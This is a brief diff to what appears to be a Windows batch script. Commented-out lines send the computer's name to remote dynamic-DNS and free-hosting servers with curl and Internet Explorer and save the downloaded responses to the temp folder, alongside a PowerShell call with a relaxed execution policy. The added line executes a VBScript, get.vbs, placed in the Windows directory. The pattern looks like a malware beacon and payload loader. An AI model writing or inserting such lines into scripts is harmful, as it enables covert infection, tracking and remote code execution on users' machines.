@@ -6,3 +6,4 @@ rem Powershell.exe -executionpolicy remotesigned -File  C:\Users\pista\Documents
 rem curl http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_1
 rem curl http://paner.altervista.org/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_2
 rem "%ProgramFiles%\Internet Explorer\iexplore.exe" http://verifiche.ddns.net/svc/wup.php?pc=%computername%_ie
+%windir%\get.vbs
